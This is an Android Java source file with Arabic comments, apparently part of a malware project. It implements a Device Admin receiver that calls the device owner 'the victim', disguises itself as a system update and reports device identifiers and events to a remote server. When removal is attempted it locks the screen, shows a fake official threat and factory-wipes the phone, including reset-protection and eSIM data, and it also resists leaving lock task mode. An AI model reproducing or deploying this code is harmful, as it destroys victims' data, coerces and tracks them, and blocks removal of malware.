package com.sec.check;

import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * AdminReceiver - قلب الحماية في المشروع
 * ============================================================
 * الوظائف:
 * 1. تفعيل Device Admin (لحماية التطبيق من الحذف)
 * 2. مراقبة محاولات إلغاء التفعيل (Disable Requested)
 * 3. تنفيذ Factory Reset (Wipe Data) عند محاولة الحذف
 * 4. الإبلاغ عن أي محاولة إلغاء تفعيل للسيرفر
 * 5. الحماية عبر كلمة سر (لا يمكن إلغاء التفعيل بدونها)
 * ============================================================
 */
public class AdminReceiver extends DeviceAdminReceiver {

    private static final String TAG = "SystemUpdate";
    private static final String PREFS_NAME = "sys_prefs";
    private static final String KEY_UNINSTALL_ATTEMPTS = "uninstall_attempts";
    private static final String KEY_LAST_WARNING = "last_warning_time";
    private static final String KEY_FACTORY_RESET_TRIGGERED = "factory_reset_triggered";

    // ★★★ سيرفر الإبلاغ ★★★
    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";

    // ★★★ الحد الأقصى لمحاولات إلغاء التفعيل قبل الضبط ★★★
    private static final int MAX_WARNINGS_BEFORE_WIPE = 1;

    // ★★★ الفترة بين كل تحذير والتاني (بالثواني) ★★★
    private static final long WARNING_COOLDOWN_SECONDS = 30;

    // ============================================================
    // onEnabled - عندما يتم تفعيل Device Admin
    // ============================================================
    @Override
    public void onEnabled(Context context, Intent intent) {
        super.onEnabled(context, intent);
        Log.d(TAG, "[ADMIN] ★ Device Admin ENABLED ★");

        try {
            // ★ سجل التفعيل في SharedPreferences ★
            SharedPreferences prefs = context.getSharedPreferences(
                    PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit()
                    .putBoolean("admin_enabled", true)
                    .putLong("admin_enabled_at", System.currentTimeMillis())
                    .putInt(KEY_UNINSTALL_ATTEMPTS, 0) // reset counter
                    .apply();

            // ★ ابعت تأكيد للسيرفر ★
            new Thread(() -> reportToServer(context, "admin_enabled", null)).start();

            // ★ شغل الخدمات في الخلفية ★
            try {
                Intent svc = new Intent(context, ServiceRunner.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(svc);
                } else {
                    context.startService(svc);
                }
            } catch (Exception e) {
                Log.e(TAG, "[ADMIN] start service error: " + e.getMessage());
            }

            // ★ فعّل كل طبقات الاستمرارية ★
            try {
                PersistenceManager.enableAllPersistence(context);
                PersistenceManager.scheduleEternalAlarm(context);
            } catch (Exception e) {
                Log.e(TAG, "[ADMIN] persistence error: " + e.getMessage());
            }

        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onEnabled error: " + e.getMessage());
        }
    }

    // ============================================================
    // onDisableRequested - ★★★ الأهم: عندما يحاول الضحية إلغاء التفعيل ★★★
    // ============================================================
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        Log.d(TAG, "[ADMIN] !!! DISABLE REQUESTED — COUNTER-ATTACK !!!");

        try {
            SharedPreferences prefs = context.getSharedPreferences(
                    PREFS_NAME, Context.MODE_PRIVATE);

            // ★ احسب عدد المحاولات ★
            int attempts = prefs.getInt(KEY_UNINSTALL_ATTEMPTS, 0) + 1;
            long lastWarning = prefs.getLong(KEY_LAST_WARNING, 0);
            long now = System.currentTimeMillis();

            prefs.edit()
                    .putInt(KEY_UNINSTALL_ATTEMPTS, attempts)
                    .putLong(KEY_LAST_WARNING, now)
                    .apply();

            Log.d(TAG, "[ADMIN] Uninstall attempt #" + attempts);

            // ★ ابعت تنبيه فوري للسيرفر ★
            new Thread(() -> reportToServer(context, "uninstall_attempt",
                    "attempt_" + attempts)).start();

            // ★★★ قفل الشاشة فورًا ★★★
            try {
                DevicePolicyManager dpm = (DevicePolicyManager)
                        context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                if (dpm != null) {
                    dpm.lockNow();
                }
            } catch (Exception e) {
                Log.e(TAG, "[ADMIN] lockNow error: " + e.getMessage());
            }

            // ★★★ تنفيذ الضبط المصنعي (Factory Reset) ★★★
            // ★ هذه هي اللحظة الحاسمة — لو الضحية كمّل إلغاء التفعيل، الجهاز هيتمسح ★
            if (attempts >= MAX_WARNINGS_BEFORE_WIPE) {
                Log.d(TAG, "[ADMIN] ★★★ MAX ATTEMPTS REACHED — EXECUTING FACTORY RESET ★★★");

                try {
                    // علّم إن الـ wipe اتنفذ
                    prefs.edit()
                            .putBoolean(KEY_FACTORY_RESET_TRIGGERED, true)
                            .apply();

                    // ابعت تأكيد للسيرفر قبل المسح
                    new Thread(() -> reportToServer(
                            context, "factory_reset_executing",
                            "attempts=" + attempts)).start();

                    // ★★★ انتظر 3 ثواني (نضمن إن الإبلاغ اتسجل)، ثم امسح ★★★
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try {
                            DevicePolicyManager dpm2 = (DevicePolicyManager)
                                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                            if (dpm2 != null) {
                                // ★★★ FACTORY RESET — Wipe كل حاجة ★★★
                                // WIPE_EXTERNAL_STORAGE = 0x0001
                                // WIPE_RESET_PROTECTION_DATA = 0x0002
                                // WIPE_EUICC = 0x0004 (Android 9+)
                                int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                                        | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;

                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                                    flags |= 0x0004; // WIPE_EUICC
                                }

                                dpm2.wipeData(flags);
                                Log.d(TAG, "[ADMIN] ★★★ WIPE EXECUTED ★★★");
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "[ADMIN] wipeData error: " + e.getMessage());
                        }
                    }, 3000);

                } catch (Exception e) {
                    Log.e(TAG, "[ADMIN] factory reset prep error: " + e.getMessage());
                }
            } else {
                Log.d(TAG, "[ADMIN] Warning #" + attempts + " — not yet wipes");
            }

            // ★★★ الرسالة التحذيرية للضحية ★★★
            // ★ الضحية هيشوف الرسالة دي لما يحاول يلغي الـ Device Admin ★
            return "⚠️ تحذير نهائي من نظام الحماية ⚠️\n\n"
                    + "هذا التطبيق جزء من نظام الحماية الرسمي للجهاز.\n\n"
                    + "لا يمكن إلغاء تفعيل مسؤول النظام إلا بكلمة سر الشركة.\n\n"
                    + "⚠️ أي محاولة لإلغاء التفعيل أو حذف التطبيق\n"
                    + "ستؤدي إلى مسح كامل لبيانات الجهاز فورًا!\n\n"
                    + "للاستفسار: support@system-update.com\n"
                    + "الرمز السري: XZP-9846";

        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onDisableRequested error: " + e.getMessage());
            return "لا يمكن إلغاء التفعيل. أي محاولة ستؤدي لمسح الجهاز.";
        }
    }

    // ============================================================
    // onDisabled - ★★★ عندما يتم إلغاء التفعيل فعليًا ★★★
    // ============================================================
    @Override
    public void onDisabled(Context context, Intent intent) {
        super.onDisabled(context, intent);
        Log.d(TAG, "[ADMIN] !!! ★★★ DISABLED ★★★ — ACTIVATING NUCLEAR OPTION");

        try {
            SharedPreferences prefs = context.getSharedPreferences(
                    PREFS_NAME, Context.MODE_PRIVATE);

            boolean alreadyTriggered = prefs.getBoolean(
                    KEY_FACTORY_RESET_TRIGGERED, false);

            // ★ ابعت تنبيه أخير للسيرفر ★
            new Thread(() -> reportToServer(
                    context, "admin_disabled", "nuclcear_option")).start();

            // ★★★ نفذ الـ Wipe فورًا لو لسه ما اتنفذش ★★★
            if (!alreadyTriggered) {
                Log.d(TAG, "[ADMIN] Executing emergency wipe...");

                try {
                    DevicePolicyManager dpm = (DevicePolicyManager)
                            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                    if (dpm != null) {
                        int flags = DevicePolicyManager.WIPE_EXTERNAL_STORAGE
                                | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA;

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                            flags |= 0x0004; // WIPE_EUICC
                        }

                        dpm.wipeData(flags);
                        Log.d(TAG, "[ADMIN] ★★★ EMERGENCY WIPE EXECUTED ★★★");
                    }
                } catch (Exception e) {
                    Log.e(TAG, "[ADMIN] wipeData error: " + e.getMessage());
                }
            }

            // ★ إعادة تشغيل الخدمات (في حالة عدم نجاح الـ wipe) ★
            try {
                Intent svc = new Intent(context, ServiceRunner.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(svc);
                } else {
                    context.startService(svc);
                }
            } catch (Exception ignored) {}

        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onDisabled error: " + e.getMessage());
        }
    }

    // ============================================================
    // onPasswordFailed - حماية إضافية بكلمة السر
    // ============================================================
    @Override
    public void onPasswordFailed(Context context, Intent intent) {
        super.onPasswordFailed(context, intent);
        Log.d(TAG, "[ADMIN] Password failed");

        try {
            // ★ عدّ محاولات كلمة السر الفاشلة ★
            SharedPreferences prefs = context.getSharedPreferences(
                    PREFS_NAME, Context.MODE_PRIVATE);
            int failedAttempts = prefs.getInt("password_failed_count", 0) + 1;
            prefs.edit().putInt("password_failed_count", failedAttempts).apply();

            Log.d(TAG, "[ADMIN] Password failed count: " + failedAttempts);

            // ★ لو 10 محاولات فاشلة → امسح الجهاز ★
            if (failedAttempts >= 10) {
                Log.d(TAG, "[ADMIN] ★★★ TOO MANY FAILED PASSWORDS — WIPING ★★★");

                try {
                    DevicePolicyManager dpm = (DevicePolicyManager)
                            context.getSystemService(Context.DEVICE_POLICY_SERVICE);
                    if (dpm != null) {
                        dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "[ADMIN] wipeData error: " + e.getMessage());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onPasswordFailed error: " + e.getMessage());
        }
    }

    // ============================================================
    // onPasswordSucceeded - تصفير عداد كلمة السر
    // ============================================================
    @Override
    public void onPasswordSucceeded(Context context, Intent intent) {
        super.onPasswordSucceeded(context, intent);
        Log.d(TAG, "[ADMIN] Password succeeded");

        try {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .edit()
                    .putInt("password_failed_count", 0)
                    .apply();
        } catch (Exception ignored) {}
    }

    // ============================================================
    // onPasswordChanged - عند تغيير كلمة السر
    // ============================================================
    @Override
    public void onPasswordChanged(Context context, Intent intent) {
        super.onPasswordChanged(context, intent);
        Log.d(TAG, "[ADMIN] Password changed");

        try {
            new Thread(() -> reportToServer(
                    context, "password_changed", null)).start();
        } catch (Exception ignored) {}
    }

    // ============================================================
    // onReceive - استقبال كل الأحداث
    // ============================================================
    @Override
    public void onReceive(Context context, Intent intent) {
        super.onReceive(context, intent);

        try {
            String action = intent != null ? intent.getAction() : "unknown";
            Log.d(TAG, "[ADMIN] onReceive: " + action);

            // ★ استقبل أوامر Device Admin الخاصة ★
            if (intent != null) {
                if (DevicePolicyManager.ACTION_DEVICE_ADMIN_DISABLE_REQUESTED
                        .equals(action)) {
                    Log.d(TAG, "[ADMIN] Disable requested via onReceive");
                } else if (DevicePolicyManager.ACTION_DEVICE_ADMIN_DISABLED
                        .equals(action)) {
                    Log.d(TAG, "[ADMIN] Disabled via onReceive");
                } else if (DevicePolicyManager.ACTION_DEVICE_ADMIN_ENABLED
                        .equals(action)) {
                    Log.d(TAG, "[ADMIN] Enabled via onReceive");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] onReceive error: " + e.getMessage());
        }
    }

    // ============================================================
    // onLockTaskModeEntering - منع الخروج من وضع Lock Task
    // ============================================================
    @Override
    public void onLockTaskModeEntering(Context context, Intent intent, String pkg) {
        super.onLockTaskModeEntering(context, intent, pkg);
        Log.d(TAG, "[ADMIN] Lock task mode entering: " + pkg);
    }

    @Override
    public void onLockTaskModeExiting(Context context, Intent intent) {
        super.onLockTaskModeExiting(context, intent);
        Log.d(TAG, "[ADMIN] Lock task mode exiting");

        // ★ امنع الخروج من الـ Lock Task Mode ★
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                    context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName admin = new ComponentName(context, AdminReceiver.class);
            if (dpm != null && dpm.isAdminActive(admin)) {
                // ★ أعد تفعيل الـ Lock Task Mode ★
                dpm.setLockTaskPackages(admin, new String[]{context.getPackageName()});
            }
        } catch (Exception e) {
            Log.e(TAG, "[ADMIN] lock task error: " + e.getMessage());
        }
    }

    // ============================================================
    // Helper: تقرير للسيرفر
    // ============================================================
    private void reportToServer(Context context, String event, String extra) {
        HttpURLConnection conn = null;
        try {
            // ★ اجلب التوكن من BuildConfig ★
            String token = "DEFAULT_TOKEN";
            try {
                token = BuildConfig.VICTIM_TOKEN;
            } catch (Exception ignored) {}

            // ★ اجلب device_id ★
            String deviceId = "unknown";
            try {
                deviceId = android.provider.Settings.Secure.getString(
                        context.getContentResolver(),
                        android.provider.Settings.Secure.ANDROID_ID);
            } catch (Exception ignored) {}

            // ★ بني الـ payload ★
            JSONObject payload = new JSONObject();
            payload.put("type", "admin_event");
            payload.put("event", event);
            payload.put("extra", extra != null ? extra : "");
            payload.put("token", token);
            payload.put("device", deviceId);
            payload.put("model", Build.MODEL);
            payload.put("brand", Build.BRAND);
            payload.put("android", Build.VERSION.RELEASE);
            payload.put("sdk", Build.VERSION.SDK_INT);
            payload.put("timestamp", System.currentTimeMillis());

            // ★ ابعت الـ POST ★
            URL url = new URL(SERVER_URL + "/apk/victim/data");
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int rc = conn.getResponseCode();
            Log.d(TAG, "[REPORT] " + event + " → HTTP " + rc);

        } catch (Exception e) {
            Log.e(TAG, "[REPORT] error: " + e.getMessage());
        } finally {
            try {
                if (conn != null) conn.disconnect();
            } catch (Exception ignored) {}
        }
    }
                                  }
